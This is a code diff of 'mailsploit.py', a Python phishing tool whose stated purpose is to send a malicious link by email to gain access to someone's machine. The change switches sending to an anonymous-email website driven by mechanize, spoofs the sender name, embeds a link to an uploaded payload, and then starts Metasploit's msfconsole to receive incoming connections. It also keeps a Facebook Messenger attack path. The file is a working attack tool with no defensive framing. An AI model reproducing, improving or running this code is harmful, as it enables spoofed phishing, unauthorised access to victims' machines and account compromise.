@@ -4,20 +4,21 @@
 # Title: mailsploit.py
 # Author: Th3J0k3r
 #
-# Purpose: to be able to send a malicious link via email or 
-# facebook to gain access to someones machine or account.
+# Purpose: to be able to send a malicious link via email
+# to gain access to someones machine.
 #
 ############################################################
+#from email.MIMEText import MIMEText
+#from email.MIMEMultipart import MIMEMultipart
+#from email.MIMEBase import MIMEBase
+#from email.utils import COMMASPACE,formatdate
+#import yagmail
+#import smtplib
+#import email
 import socket
-import yagmail
-import smtplib
 import ConfigParser
 import mimetypes
-import email
-from email.MIMEText import MIMEText
-from email.MIMEMultipart import MIMEMultipart
-from email.MIMEBase import MIMEBase
-from email.utils import COMMASPACE,formatdate
+import mechanize
 import time
 import os
 from lazyme.string import color_print
@@ -57,8 +58,8 @@ def setup ():
 	# Setup the config file
 	global targetEmail
 	global spoofName
-	global email
-	global password
+	#global email
+	#global password
 	global subject
 	global message
 	global emailImage
@@ -72,8 +73,8 @@ def setup ():
 	configParser.read('config')
 	targetEmail = configParser.get('Config', 'targetEmail')
 	spoofName  = configParser.get('Config', 'spoofName')
-	email    = configParser.get('Config', 'email')
-	password = configParser.get('Config', 'password')
+	#email    = configParser.get('Config', 'email')
+	#password = configParser.get('Config', 'password')
 	subject = configParser.get('Config', 'subject')
 	message = configParser.get('Config', 'message')
 	fbuser = configParser.get('Config', 'fbuser')
@@ -91,25 +92,22 @@ def setup ():
 			global isUsingMessenger
 
 			# Validate the input.
-			if (spoofName == 'None' or email == 'None' or password == 'None' or targetEmail == 'None'):
-				color_print('[!] Please setup your config file for mail attacks.', color='red')	
+			if (spoofName == 'None' or targetEmail == 'None'):
+				color_print('[!] Please setup your config file.', color='red')	
 				return
 			else:
 				# Connects to the server.
 				isUsingMessenger = False
-				connect()
+				sendMailUsingMechanize()
 		else:
 			# Validate the input.
 			if (fbusername == 'None' or fbpassword == 'None' or fbmessage == 'None' or fbuserID == 'None'):
-				color_print('[!] Please setup your config file for facebook messenger attacks', color='red')	
+				color_print('[!] Please setup your config file.', color='red')	
 				return
 			else:
 				isUsingMessenger = True
 				sendToMessenger()
 
-#
-# Sends a malicious message through to FB Messenger.
-#
 def sendToMessenger():
 
 	client = Client(fbusername, fbpassword)
@@ -155,38 +153,69 @@ def sendToMessenger():
 #
 # Connects to the smtp server.
 #
-def connect():
+def sendMailUsingMechanize():
 
 	# get the smtp server via user input.
 	color_print("[+] Getting everything ready.", color='blue')
-		
+	br = mechanize.Browser()
+	url = "http://anonymouse.org/anonemail.html"
+	headers = "Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)"
+	br.addheaders = [('User-agent', headers)]
+	br.open(url)
+	br.set_handle_equiv(True)
+	br.set_handle_gzip(True)
+	br.set_handle_redirect(True)
+	br.set_handle_robots(False)
+	br.set_debug_http(False)
+	br.set_debug_redirects(False)
+
+	# Get the link
+	link = getLink()
+	# Create the specially crafted link.
+	html = '<a href="'+link+'">'+link+'</a>'
+
+	br.select_form(nr=0)
+	br.form['to'] = targetEmail
+	br.form['subject'] = subject
+	br.form['text'] = message + '\n\n' + html
 	# attempt to connect to the stmp server.
 	try:
-		# Connecting to the server.
-		try:
-			# Create the yagmail object
-			yag = yagmail.SMTP({email:spoofName}, password)
+			
+		# Create the yagmail object
+		#yag = yagmail.SMTP({email:spoofName}, password)
 
-			try:
-				# Send the mail.
-				sendEmail(yag, email, targetEmail, spoofName, subject, message)
-			except KeyboardInterrupt:
-				color_print("Thanks, Happy hacking", color='blue')
+		try:
+
+
+			# Print out a thew important messages.
+			color_print("[+] Sending email to.. " + targetEmail, color='blue')
+			time.sleep(2)
+			color_print("[+] Spoofing email.. ", color='blue')
+			time.sleep(2)
+			color_print("[*] Sending malicious link..", color='yellow')
+			time.sleep(1)
+
+			# Send the mail.
+			results = br.submit()
+			response = br.response().read()
+				
+			if "The e-mail has been sent anonymously!" in response:
+				color_print('The email has been sent successfully\n The recipient will get it in 12 hours!!', color='green')
+				listenForConnections()
+				
+			else:
+				color_print("[!] Failed to send email", color='red')
+		except KeyboardInterrupt:
+			color_print("Thanks, Happy hacking", color='blue')
 		
 			#color_print("[+] Connected.", color='green')
-
-		except smtplib.SMTPServerDisconnected:
-			color_print("[!] Connection unexpectedly closed, \n[!] you might be behind a firewall! Try using a VPN.", color='red')
-			return
 
 	except socket.gaierror:
 		# Failed to connect!!.
 		color_print("\n[!] Could not connect to the server.", color='red')
 		return
 
-#
-# Grabs the malicious link
-#
+
 def getLink ():
 	# Tell the user to upload there file.
 	color_print("Upload it to a free file hosting website: https://nofile.io/", color='yellow')
@@ -196,31 +225,27 @@ def getLink ():
 	while len(link) == 0: link = raw_input("Paste the link to your file: ")
 	return link
 
-
+#def sendEmail (server, fromAddr, toAddr, spoofName, subject, message):
 #
-# Sends a malicious email
+#	# Get the link
+#	link = getLink()
+#	# Create the specially crafted link.
+#	html = '<a href="'+link+'">'+link+'</a>'
 #
-def sendEmail (server, fromAddr, toAddr, spoofName, subject, message):
-
-	# Get the link
-	link = getLink()
-	# Create the specially crafted link.
-	html = '<a href="'+link+'">'+link+'</a>'
-
-
-	# Print out a thew important messages.
-	color_print("[+] Sending email to " + toAddr, color='blue')
-	time.sleep(2)
-	color_print("[+] Spoofing email " + spoofName, color='yellow')
-	time.sleep(2)
-	color_print("[*] Sending malicious link..", color='yellow')
-	time.sleep(1)
-
-	# Send the message.
-	server.send(fromAddr, subject, [message, html])
-	color_print("\n[*] Email sent", color='green')
-
-	listenForConnections()
+#
+#	# Print out a thew important messages.
+#	color_print("[+] Sending email to " + toAddr, color='blue')
+#	time.sleep(2)
+#	color_print("[+] Spoofing email " + spoofName, color='yellow')
+#	time.sleep(2)
+#	color_print("[*] Sending malicious link..", color='yellow')
+#	time.sleep(1)
+#
+#	# Send the message.
+#	server.send(fromAddr, subject, [message, html])
+#	color_print("\n[*] Email sent", color='green')
+#
+#	listenForConnections()
 	
 
 #
@@ -252,71 +277,71 @@ def listenForConnections ():
 		os.system('cat resource.rc')
 		os.system('msfconsole -r resource.rc')
 	else:
-		color_print("[+] Generated a report..", color='green')
-		if isUsingMessenger == False:
-			generateMailReport(fromAddr, toAddr, spoofName, subject, message, html)
-		else:
-			generateMessengerReport(fbuser, fbuserID, fbmessage, link)
+		#color_print("[+] Generated a report..", color='green')
+		#if isUsingMessenger == False:
+		#	generateMailReport(fromAddr, toAddr, spoofName, subject, message, html)
+		#else:
+		#	generateMessengerReport(fbuser, fbuserID, fbmessage, link)
 		color_print("\nThanks, Happy hacking", color='blue')
 		return	
 
 
 # Generate a html report
-def generateMessengerReport(fbuser, fbuserID, message, link):		
-		f = open("reports/" + fbuser + ".html", "w")
-		f.write("""
-<!DOCTYPE html>
-<html>
-<div style="display: flex; justify-content: center;">
-  <img src='"""+user.photo+"""' style="width: 40px; height: 40px;" />
-</div>
-<body style="background-color:white;">
-<title> MailSpoof Report </title>
-<table style="width:100%">
-  <tr>
-    <th>User</th>
-    <th>ID</th> 
-    <th>Message</th>
-    <th>Link</th>
-  </tr>
-  <tr>
-    <td>""" + str(fbuser) +"""</td>
-    <td>""" + str(fbuserID) +"""</td>
-    <td>""" + str(message) +"""</td>
-    <td><a href='""" + str(link) + """'>"""+link+"""</a></td>
-  </tr>
-</table>
-</html>""")
-		f.close()	
+#def generateMessengerReport(fbuser, fbuserID, message, link):		
+#		f = open("reports/" + fbuser + ".html", "w")
+#		f.write("""
+#<!DOCTYPE html>
+#<html>
+#<div style="display: flex; justify-content: center;">
+#  <img src='"""+user.photo+"""' style="width: 40px; height: 40px;" />
+#</div>
+#<body style="background-color:white;">
+#<title> MailSpoof Report </title>
+#<table style="width:100%">
+#  <tr>
+#    <th>User</th>
+#    <th>ID</th> 
+#    <th>Message</th>
+#    <th>Link</th>
+#  </tr>
+#  <tr>
+#    <td>""" + str(fbuser) +"""</td>
+#    <td>""" + str(fbuserID) +"""</td>
+#    <td>""" + str(message) +"""</td>
+#    <td><a href='""" + str(link) + """'>"""+link+"""</a></td>
+#  </tr>
+#</table>
+#</html>""")
+#		f.close()	
 
 # Generate a html report
-def generateMailReport(fromemail, toemail, spoofemail, subject, message, link):		
-		f = open("reports/" + toemail + ".html", "w")
-		f.write("""
-<!DOCTYPE html>
-<html>
-<body style="background-color:white;">
-<title> MailSpoof Report </title>
-<table style="width:100%">
-  <tr>
-    <th>From Email</th>
-    <th>To Email</th> 
-    <th>Spoofed Email</th>
-    <th>Subject</th>
-    <th>Message</th>
-    <th>Link</th>
-  </tr>
-  <tr>
-    <td>""" + str(fromemail) +"""</td>
-    <td>""" + str(toemail) +"""</td>
-    <td>""" + str(spoofemail) +"""</td>
-    <td>""" + str(subject) +"""</td>
-    <td>""" + str(message) +"""</td>
-    <td>""" + str(link) + """</td>
-  </tr>
-</table>
-</html>""")
-		f.close()
+#def generateMailReport(fromemail, toemail, spoofemail, subject, message, link):		
+#		f = open("reports/" + toemail + ".html", "w")
+#		f.write("""
+#<!DOCTYPE html>
+#<html>
+#<body style="background-color:white;">
+#<title> MailSpoof Report </title>
+#<table style="width:100%">
+#  <tr>
+#    <th>From Email</th>
+#    <th>To Email</th> 
+#    <th>Spoofed Email</th>
+#    <th>Subject</th>
+#    <th>Message</th>
+#    <th>Link</th>
+#  </tr>
+#  <tr>
+#    <td>""" + str(fromemail) +"""</td>
+#    <td>""" + str(toemail) +"""</td>
+#    <td>""" + str(spoofemail) +"""</td>
+#    <td>""" + str(subject) +"""</td>
+#    <td>""" + str(message) +"""</td>
+#    <td>""" + str(link) + """</td>
+#  </tr>
+#</table>
+#</html>""")
+#		f.close()
 	
 
 #### Call the methods ####
